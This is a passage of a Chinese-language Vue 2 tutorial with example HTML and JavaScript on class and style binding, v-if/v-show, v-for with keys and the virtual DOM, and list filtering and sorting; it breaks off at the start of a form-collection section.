<font style="color:#595959;">      <button @click="</font>**<font style="color:#595959;">changeBig</font>**<font style="color:#595959;">">变大</button></font>

<font style="color:#595959;">      <button @click="</font>**<font style="color:#595959;">changeSmall</font>**<font style="color:#595959;">">变小</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Class绑定之字符串形式",</font>

<font style="color:#595959;">          c1: "small",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          </font>**<font style="color:#595959;">changeBig() {</font>**

**<font style="color:#595959;">            this.c1 = "big";</font>**

**<font style="color:#595959;">          },</font>**

**<font style="color:#595959;">          changeSmall() {</font>**

**<font style="color:#595959;">            this.c1 = "small";</font>**

**<font style="color:#595959;">          },</font>**

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 2、绑定数组
**<font style="color:#FF0000;">适用于绑定的样式名字不确定，并且个数也不确定</font>**。

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Class绑定之数组形式</title></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      .static {</font>

<font style="color:#595959;">        border: 1px solid black;</font>

<font style="color:#595959;">        width: 100px;</font>

<font style="color:#595959;">        height: 100px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .active {</font>

<font style="color:#595959;">        background-color: green;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .text-danger {</font>

<font style="color:#595959;">        color: red;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 静态写法 --></font>

<font style="color:#595959;">      <div class="static active text-danger">{{msg}}</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <!-- 动态写法：动静结合 --></font>

<font style="color:#595959;">      <div class="static" </font>**<font style="color:#595959;">:class="['active','text-danger']"</font>**<font style="color:#595959;">>{{msg}}</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <div class="static" :class="[c1, c2]">{{msg}}</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <!-- 适用场景：</font>**<font style="color:#595959;">当样式的个数不确定，并且样式的名字也不确定的时候，可以采用数组形式</font>**<font style="color:#595959;">。 --></font>

<font style="color:#595959;">      <div class="static" </font>**<font style="color:#595959;">:class="classArray"</font>**<font style="color:#595959;">>{{msg}}</div></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Class绑定之数组形式",</font>

<font style="color:#595959;">          c1: "active",</font>

<font style="color:#595959;">          c2: "text-danger",</font>

<font style="color:#595959;">         </font>**<font style="color:#595959;"> classArray: ["active", "text-danger"],</font>**

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 3、绑定对象
适用于**<font style="color:#FF0000;">样式名字和个数都确定，但是要动态决定用或者不用。</font>**

<font style="color:#595959;"> <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Class绑定之对象形式</title></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      .static {</font>

<font style="color:#595959;">        border: 1px solid black;</font>

<font style="color:#595959;">        width: 100px;</font>

<font style="color:#595959;">        height: 100px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .active {</font>

<font style="color:#595959;">        background-color: green;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      .text-danger {</font>

<font style="color:#595959;">        color: red;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 动态写法：动静结合 --></font>

<font style="color:#595959;">      <!-- 对象形式的适用场景：</font>**<font style="color:#595959;">样式的个数是固定的，样式的名字也是固定的，但是需要动态的决定样式用还是不用</font>**<font style="color:#595959;">。 --></font>

<font style="color:#595959;">      <div class="static" :class="classObj">{{msg}}</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <div class="static" </font>**<font style="color:#595959;">:class="{active:true,'text-danger':false}"</font>**<font style="color:#595959;">>{{msg}}</div></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Class绑定之对象形式",</font>

<font style="color:#595959;">          </font>**<font style="color:#595959;">classObj: {</font>**

**<font style="color:#595959;">            </font>****<font style="color:#FF0000;">// 该对象中属性的名字必须和css中样式名一致。</font>**

**<font style="color:#595959;">            active: false,</font>**

**<font style="color:#595959;">            "text-danger": true,</font>**

**<font style="color:#595959;">          },</font>**

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.6.2 style绑定
<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Style绑定</title></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      .static {</font>

<font style="color:#595959;">        border: 1px solid black;</font>

<font style="color:#595959;">        width: 100px;</font>

<font style="color:#595959;">        height: 100px;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 静态写法 --></font>

<font style="color:#595959;">      <div class="static" style="background-color: green">静态写法</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <!-- 动态写法：</font>**<font style="color:#595959;">字符串形式</font>**<font style="color:#595959;"> --></font>

<font style="color:#595959;">      <div class="static" </font>**<font style="color:#595959;">:style="myStyle"</font>**<font style="color:#595959;">>动态写法：字符串形式</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <!-- 动态写法：对象形式 --></font>

<font style="color:#595959;">      <div class="static" </font>**<font style="color:#595959;">:style="{'background-color': 'gray'}"</font>**<font style="color:#595959;">>动态写法1：对象形式</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <div class="static" :style="styleObj1">动态写法2：对象形式</div></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <!-- 动态写法：</font>**<font style="color:#595959;">数组形式</font>**<font style="color:#595959;"> --></font>

<font style="color:#595959;">      <div class="static" </font>**<font style="color:#595959;">:style="styleArray"</font>**<font style="color:#595959;">>动态写法：数组形式</div></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Style绑定",</font>

<font style="color:#595959;">          myStyle: "background-color: gray;",</font>

<font style="color:#595959;">          </font>**<font style="color:#595959;">styleObj1: {</font>**

**<font style="color:#595959;">            backgroundColor: "green",</font>**

**<font style="color:#595959;">          },</font>**

<font style="color:#595959;">         </font>**<font style="color:#595959;"> styleArray: [{ backgroundColor: "green" }, { color: "red" }],</font>**

**<font style="color:#595959;">	//</font>**一个数组，每个元素都是一个样式对象

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>



## 《2.7-8、条件&循环渲染》
## 2.7、条件渲染
### 2.7.1 v-if 
指令用于**<u>条件性地渲染</u>**一块内容。这块内容只会在指令的表达式返回<u>true时才被渲染</u>

### 2.7.2 v-else-if、v-else 
顾名思义，v-else-if 提供的是相应于 v-if 的“else if 区块”。它可以连续多次重复使用。

一个使用 v-else-if 的元素必须紧跟在一个 v-if 或一个 v-else-if元素后面。

你也可以使用 v-else 为 v-if 添加一个“else 区块”，当然，v-else元素也是必须紧跟在一个 v-if 或一个 v-else-if元素后面。

需求：根据温度判断天气情况

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433645554-7d5197e7-2f94-40bc-86fb-306fa41a94a5.png)

<font style="color:#595959;"><!-- </font>**<font style="color:#FF0000;">v-if v-else-if v-else三者在使用的时候，中间不能断开</font>**<font style="color:#595959;">。 --></font>

<font style="color:#595959;">温度：<input type="number" v-model="temprature" ><br /><br /></font>

<font style="color:#595959;">天气：<span v-if="temprature <= 10">寒冷</span></font>

<font style="color:#595959;"><span v-else-if="temprature <= 25">凉爽</span></font>

<font style="color:#595959;"><span v-else>炎热</span></font>

<font style="color:#595959;"><hr></font>

### 2.7.3 <template>与v-if 
因为 v-if 是一个指令，他必须依附于某个元素。

但如果我们想要切换不止一个元素呢？

在这种情况下我们可以在一个 **<u><font style="color:#FF0000;"><template> </font></u>****<u>元素上使用 v-if，</u>**

这只是一个**<u>不可见的包装器元素</u>**，最后渲染的结果并不会包含个 <template> 元素。v-else 和 v-else-if 也可以在 <template> 上使用。

<font style="color:#595959;"><!--3、 template标签/元素只是起到占位的作用，不会真正的出现在页面上，也不会影响页面的结构。 --></font>

<font style="color:#595959;">   <template v-if="counter === 10"></font>

<font style="color:#595959;">      <h2>六下匹，人当送，内。</h2></font>

<font style="color:#595959;">      <h3>六下匹，人当送，内。</h3></font>

<font style="color:#595959;">      <h4>六下匹，人当送，内。</h4></font>

<font style="color:#595959;">    </template></font>

### 2.7.4 v-show
另一个可以用来按**<u>条件显示一个元素</u>**的指令是 v-show。其用法基本一样：

<font style="color:#595959;">  <div v-show="false">v-show-{{msg}}</div></font>

<font style="color:#595959;">  <div v-show="2 === 1">v-show-{{msg}}</div></font>

不同之处在于 **<u>v-show 会在 DOM 渲染中保留该元素</u>**；v-show 仅**<u>切换</u>**了该**<u>元素</u>**上名为 **<u>display 的 CSS 属性</u>**。

不能和 v-else 搭配使用。

### 2.7.5 v-if VS v-show 
v-if 是“真实的”按条件渲染，因为它确保了在切换时，条件区块内的事件监听器和子组件都会被销毁与重建

v-if 也是惰性的：如果在初次渲染时条件值为 false，则不会做任何事。条件区块只有当条件首次变为 true 时才被渲染。相比之下，v-show 简单许多，元素无论初始条件如何，始终会被渲染，只有 CSS display属性会被切换。

总的来说，**<u>v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要频繁切换，则使用 v-show 较好；如果在运行时绑定条件很少改变，则 v-if 会更合适。</u>**

## 2.8、循环渲染
语法格式：v-for指令。该指令**<u>用在被遍历的标签上</u>**。

**<font style="color:#FF0000;">v-for="(element, index) in elements" :key="element.id" </font>**

或者

**<font style="color:#FF0000;">v-for="(element, index) of elements" :key="element.id"</font>**

### 2.8.1 遍历数组、对象、字符串、指定次数 
#### 1、遍历对象
<font style="color:#595959;">  <h2>遍历对象的属性</h2></font>

<font style="color:#595959;">  <ul>	     </font><font style="color:#FF0000;">// 属性值，属性名</font>

<font style="color:#595959;">    <li v-for="(value, propertyName) of user">{{propertyName}},{{value}}</li></font>

<font style="color:#595959;">  </ul></font>

<font style="color:#595959;">  <hr /></font>

#### 2、遍历字符串
<font style="color:#595959;">  <h2>遍历字符串</h2></font>

<font style="color:#595959;">  <ul>	      </font><font style="color:#FF0000;">//字符，索引</font><font style="color:#595959;">	</font>

<font style="color:#595959;">    <li v-for="(c,index) of str">{{index}},{{c}}</li></font>

<font style="color:#595959;">  </ul></font>

<font style="color:#595959;">  <hr /></font>

#### 3、遍历指定次数
<font style="color:#595959;">  <h2>遍历指定的次数</h2></font>

<font style="color:#595959;">    <ul>	    </font><font style="color:#FF0000;">  // 数字，索引</font>

<font style="color:#595959;">      <li v-for="(num,index) of counter">{{index}}, {{num}}</li></font>

<font style="color:#595959;">    </ul></font>

<font style="color:#595959;">    <hr /></font>

#### 4、遍历数组
<font style="color:#595959;"> <h2>遍历数组</h2></font>

<font style="color:#595959;">      <!-- 静态列表 --></font>

<font style="color:#595959;">      <ul></font>

<font style="color:#595959;">        <li>张三</li></font>

<font style="color:#595959;">        <li>李四</li></font>

<font style="color:#595959;">        <li>王五</li></font>

<font style="color:#595959;">      </ul></font>



<font style="color:#595959;">      <!-- 动态列表 --></font>

<font style="color:#595959;">      <ul></font>

<font style="color:#595959;">        <!-- </font>

**<font style="color:#FF0000;">                1. v-for要写在循环项上。</font>**

**<font style="color:#FF0000;">                2. v-for的语法规则：</font>**

**<font style="color:#FF0000;">                    v-for="(变量名,index) in/of 数组"</font>**

**<font style="color:#FF0000;">                    变量名 代表了 数组中的每一个元素</font>**

<font style="color:#595959;">             -->	</font>

<font style="color:#595959;">	         </font><font style="color:#FF0000;"> //元素，索引</font>

<font style="color:#595959;">        <li v-for="(name,index) of names">{{name}}-{{index}}</li></font>

<font style="color:#595959;">      </ul></font>



<font style="color:#595959;">      <table></font>

<font style="color:#595959;">        <tr></font>

<font style="color:#595959;">          <th>序号</th></font>

<font style="color:#595959;">          <th>会员名</th></font>

<font style="color:#595959;">          <th>年龄</th></font>

<font style="color:#595959;">          <th>选择</th></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">        <tr v-for="(vip,index) in vips"></font>

<font style="color:#595959;">          <td>{{index+1}}</td></font>

<font style="color:#595959;">          <td>{{vip.name}}</td></font>

<font style="color:#595959;">          <td>{{vip.age}}</td></font>

<font style="color:#595959;">          <td><input type="checkbox" /></td></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">      </table></font>

### 2.8.2 虚拟dom和diff算法
虚拟DOM：<u>在内存中的dom对象</u>

diff算法：是一种能够<u>快速的比</u>较出两个事物不同之处的算法

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/webp/50923934/1742433645802-0278eac5-4f0d-4a4c-996b-560efb445e04.webp)

v-for指令所在的标签中，还有一个非常重要的属性：:key

<u>如果没有指定 :key 属性，会自动拿index作为key。这个key是这个dom元素的</u>**<u><font style="color:#FF0000;">身份证号</font></u>**<u>/唯一标识。</u>



#### 1、 虚拟DOM中key的作用（diff到底是怎么做对比？）：
key是虚拟DOM中对象的标识，当数据发生变化时，Vue会根据新数据生成新的虚拟DOM，随后Vue进行新虚拟DOM与旧虚拟DOM的差异比较，比较规则如下

a:<u>旧</u>虚拟DOM中找到与<u>新</u>虚拟DOM中<u>相同的key</u>

若虚拟DOM中<u>内容没变</u>，<u>直接使用之前的真实DOM</u>

若虚拟DOM中内容<u>变了</u>，则<u>生成新的真实DOM</u>，随后替换掉页面中之前的真实DOM

b:<u>旧</u>虚拟DOM<u>中未找到</u>与新虚拟DOM<u>相同的key</u>，则<u>直接创建新的真实DOM</u>，随后渲染到页面

#### 2、 用index作为key可能会引发的问题
a：若对数据进行<u>逆序添加、逆序删除等</u>**<u><font style="color:#FF0000;">破坏顺序操作</font></u>**，会产生没有必要的真实DOM更新，当然界面渲染没有问题，就是**<u>效率低</u>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433646025-f2287fc6-3f76-4766-9ca6-7dc514ef560a.png)



b：**<font style="color:#FF0000;">若结构中还包含输入类的DOM：会产生错误DOM更新，也就是界面有问题</font>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433646309-161fa527-041c-4cc8-88a4-6b0b69b2c46a.png)

#### 3、开发中如何选择key
a：最好使用每条数据的**<font style="color:#FF0001;">唯一标识</font>**作为key，比如id、手机号、身份证号、学号等唯一值

b：如果不存在对数据的逆序添加，逆序删除等破坏顺序的操作，**<u>仅用于渲染列表，使用index作为key是没有问题的</u>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433646580-228e18de-7c84-488f-8ef2-f7203c13696b.png)

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>虚拟dom与diff算法</title></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">    <style></font>

<font style="color:#595959;">      th,</font>

<font style="color:#595959;">      td {</font>

<font style="color:#595959;">        border: 1px solid black;</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </style></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- </font>

<font style="color:#595959;">    需求1、在数组的最后添加一个数据</font>

<font style="color:#595959;">    需求2、在数组的前面添加一个数据</font>

<font style="color:#595959;">    </font>

<font style="color:#595959;">        v-for指令所在的标签中，还有一个非常重要的属性：:key</font>

<font style="color:#595959;">        如果没有指定 :key 属性，会自动拿index作为key。</font>

<font style="color:#595959;">        这个key是这个dom元素的身份证号/唯一标识。</font>



<font style="color:#595959;">        </font>**<font style="color:#595959;">分析以下：采用 index 作为key存在什么问题？</font>**

**<font style="color:#595959;">            第一个问题：效率低。</font>**

**<font style="color:#595959;">            第二个问题：非常严重了。产生了错乱。尤其是对数组当中的某些元素进行操作。（非末尾元素。）</font>**

**<font style="color:#595959;">        怎么解决这个问题？</font>**

**<font style="color:#595959;">            建议使用对象的id作为key</font>**

<font style="color:#595959;">        --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <table></font>

<font style="color:#595959;">        <tr></font>

<font style="color:#595959;">          <th>序号</th></font>

<font style="color:#595959;">          <th>英雄</th></font>

<font style="color:#595959;">          <th>能量值</th></font>

<font style="color:#595959;">          <th>选择</th></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">        <!-- 这种写法会出现错乱 --></font>

<font style="color:#595959;">        <tr v-for="(hero,index) in heros" :key="index"></font>

<font style="color:#595959;">          <td>{{index+1}}</td></font>

<font style="color:#595959;">          <td>{{hero.name}}</td></font>

<font style="color:#595959;">          <td>{{hero.power}}</td></font>

<font style="color:#595959;">          <td><input type="checkbox" /></td></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">      </table></font>



<font style="color:#595959;">      <button @click="add">添加英雄麦文</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "虚拟dom与diff算法",</font>

<font style="color:#595959;">          heros: [</font>

<font style="color:#595959;">            { id: "101", name: "艾格文", power: 10000 },</font>

<font style="color:#595959;">            { id: "102", name: "麦迪文", power: 9000 },</font>

<font style="color:#595959;">            { id: "103", name: "古尔丹", power: 8000 },</font>

<font style="color:#595959;">            { id: "104", name: "萨尔", power: 6000 },</font>

<font style="color:#595959;">          ],</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          add() {</font>

<font style="color:#595959;">            this.heros.unshift({ id: "105", name: "麦文", power: 9100 });</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>





## 《2.9-10、列表操作》
## 2.9、列表过滤
### 2.9.1、回顾filter
<font style="color:#595959;">let arr = [1,2,3,4,5,6,7,8,9]</font>

**<u><font style="color:#595959;">// filter不会破坏原数组的结构，会生成一个全新的数组。</font></u>**

<font style="color:#595959;">let newArr = arr.filter((num) => {</font>

<font style="color:#595959;">  //return 过滤规则</font>

<font style="color:#595959;">  return num < 5</font>

<font style="color:#595959;">})</font>



<font style="color:#595959;">console.log(newArr)</font>

2.9.2、列表过滤watch属性实现

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <input type="text" placeholder="请输入搜索关键字" v-model="keyword" /></font>

<font style="color:#595959;">      <table></font>

<font style="color:#595959;">        <tr></font>

<font style="color:#595959;">          <th>序号</th></font>

<font style="color:#595959;">          <th>姓名</th></font>

<font style="color:#595959;">          <th>薪资</th></font>

<font style="color:#595959;">          <th>选择</th></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">        <tr v-for="(hero,index) in filteredHeros" :key="hero.id"></font>

<font style="color:#595959;">          <td>{{index+1}}</td></font>

<font style="color:#595959;">          <td>{{hero.name}}</td></font>

<font style="color:#595959;">          <td>{{hero.power}}</td></font>

<font style="color:#595959;">          <td><input type="checkbox" /></td></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">      </table></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          keyword: "",</font>

<font style="color:#595959;">          msg: "列表过滤",</font>

<font style="color:#595959;">          heros: [</font>

<font style="color:#595959;">            { id: "101", name: "章三", power: 10000 },</font>

<font style="color:#595959;">            { id: "102", name: "三响", power: 9000 },</font>

<font style="color:#595959;">            { id: "103", name: "李四", power: 8000 },</font>

<font style="color:#595959;">            { id: "104", name: "李章", power: 6000 },</font>

<font style="color:#595959;">          ],</font>

<font style="color:#595959;">          filteredHeros: [],</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        watch: {</font>

<font style="color:#595959;">            //有bug，无法一开始就检测</font>

<font style="color:#595959;">         </font>**<font style="color:#595959;"> /* keyword(val){</font>**

**<font style="color:#595959;">            // 执行过滤规则</font>**

**<font style="color:#FF0000;">            this.filteredHeros = this.heros.filter((hero) => {</font>**

**<font style="color:#FF0000;">                return hero.name.indexOf(val) >= 0</font>**

**<font style="color:#595959;">            })</font>**

**<font style="color:#595959;">            } */</font>**

<font style="color:#595959;">            //使用完整形式</font>

<font style="color:#595959;">          keyword: {</font>

<font style="color:#595959;">            immediate: true,</font>

<font style="color:#595959;">            handler(val) {</font>

<font style="color:#595959;">              this.filteredHeros = this.heros.filter((hero) => {</font>

<font style="color:#595959;">                return hero.name.indexOf(val) >= 0;</font>

<font style="color:#595959;">              });</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.9.3、列表过滤computed属性实现
<font style="color:#595959;"> <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <input type="text" placeholder="请输入搜索关键字" v-model="keyword" /></font>

<font style="color:#595959;">      <table></font>

<font style="color:#595959;">        <tr></font>

<font style="color:#595959;">          <th>序号</th></font>

<font style="color:#595959;">          <th>姓名</th></font>

<font style="color:#595959;">          <th>薪资</th></font>

<font style="color:#595959;">          <th>选择</th></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">        <tr v-for="(hero,index) in filteredHeros" :key="hero.id"></font>

<font style="color:#595959;">          <td>{{index+1}}</td></font>

<font style="color:#595959;">          <td>{{hero.name}}</td></font>

<font style="color:#595959;">          <td>{{hero.power}}</td></font>

<font style="color:#595959;">          <td><input type="checkbox" /></td></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">      </table></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          keyword: "",</font>

<font style="color:#595959;">          msg: "列表过滤",</font>

<font style="color:#595959;">          heros: [</font>

<font style="color:#595959;">            { id: "101", name: "章三", power: 10000 },</font>

<font style="color:#595959;">            { id: "102", name: "三响", power: 9000 },</font>

<font style="color:#595959;">            { id: "103", name: "李四", power: 8000 },</font>

<font style="color:#595959;">            { id: "104", name: "李章", power: 11000 },</font>

<font style="color:#595959;">          ],</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        computed: {</font>

<font style="color:#595959;">          filteredHeros() {</font>

<font style="color:#595959;">            // 执行过滤</font>

<font style="color:#595959;">            return this.heros.filter((hero) => {</font>

<font style="color:#595959;">              return hero.name.indexOf(this.keyword) >= 0;</font>

<font style="color:#595959;">            });</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

## 2.10、列表排序
### 2.10.1、回顾sort方法
<font style="color:#595959;"> // 回顾sort方法</font>

<font style="color:#595959;">      let arr = [8, 9, 5, 4, 1, 2, 3];</font>



<font style="color:#595959;">  </font>**<font style="color:#595959;">    </font>****<u><font style="color:#595959;">// sort方法排序之后，不会生成一个新的数组，是在原数组的基础之上进行排序，会影响原数组的结构。</font></u>**

**<font style="color:#595959;">      arr.sort((a, b) => {</font>**

**<font style="color:#595959;">        // a在前，升序，b在前降序</font>**

**<font style="color:#595959;">        return b - a;</font>**

<font style="color:#595959;">      </font>**<font style="color:#595959;">});</font>**



<font style="color:#595959;">      console.log(arr);</font>

### 2.10.2、列表排序
<font style="color:#595959;"> <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <input type="text" placeholder="请输入搜索关键字" v-model="keyword" /></font>

<font style="color:#595959;">      <br /></font>

<font style="color:#595959;">      <button @click="type = 1">升序</button></font>

<font style="color:#595959;">      <button @click="type = 2">降序</button></font>

<font style="color:#595959;">      <button @click="type = 0">原序</button></font>

<font style="color:#595959;">      <table></font>

<font style="color:#595959;">        <tr></font>

<font style="color:#595959;">          <th>序号</th></font>

<font style="color:#595959;">          <th>英雄</th></font>

<font style="color:#595959;">          <th>能量值</th></font>

<font style="color:#595959;">          <th>选择</th></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">        <tr v-for="(hero,index) in filteredHeros" :key="hero.id"></font>

<font style="color:#595959;">          <td>{{index+1}}</td></font>

<font style="color:#595959;">          <td>{{hero.name}}</td></font>

<font style="color:#595959;">          <td>{{hero.power}}</td></font>

<font style="color:#595959;">          <td><input type="checkbox" /></td></font>

<font style="color:#595959;">        </tr></font>

<font style="color:#595959;">      </table></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

**<font style="color:#595959;">          // 定义标识项，1是升序，2是降序，0是原序</font>**

**<font style="color:#595959;">          type: 0,</font>**

<font style="color:#595959;">          keyword: "",</font>

<font style="color:#595959;">          msg: "列表排序",</font>

<font style="color:#595959;">          heros: [</font>

<font style="color:#595959;">            { id: "101", name: "章三", power: 10000 },</font>

<font style="color:#595959;">            { id: "102", name: "三响", power: 9000 },</font>

<font style="color:#595959;">            { id: "103", name: "李四", power: 8000 },</font>

<font style="color:#595959;">            { id: "104", name: "李章", power: 11000 },</font>

<font style="color:#595959;">          ],</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        computed: {</font>

<font style="color:#595959;">          filteredHeros() {</font>

<font style="color:#595959;">            // 执行过滤  拿到过滤后的数组</font>

<font style="color:#595959;">            const arr = this.heros.filter((hero) => {</font>

<font style="color:#595959;">              return hero.name.indexOf(this.keyword) >= 0;</font>

<font style="color:#595959;">            });</font>

<font style="color:#595959;">           </font>**<font style="color:#595959;"> // 排序，根据type值进行降排序</font>**

<font style="color:#595959;">            </font>**<font style="color:#595959;">if (this.type === 1) {</font>**

**<font style="color:#595959;">              arr.sort((a, b) => {</font>**

**<font style="color:#595959;">                return a.power - b.power;</font>**

**<font style="color:#595959;">              });</font>**

**<font style="color:#595959;">            } else if (this.type == 2) {</font>**

**<font style="color:#595959;">              arr.sort((a, b) => {</font>**

**<font style="color:#595959;">                return b.power - a.power;</font>**

**<font style="color:#595959;">              });</font>**

**<font style="color:#595959;">            }</font>**



**<font style="color:#595959;">            // 返回</font>**

**<font style="color:#595959;">            return arr;</font>**

**<font style="color:#595959;">          },</font>**

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>





## 《2.11-12、收集表单数据&过滤器》
## 2.11、收集表单数据
需求：收集以下表单的数据

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433646903-be0506be-9f39-41e3-973c-ba48be2494c6.png)

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

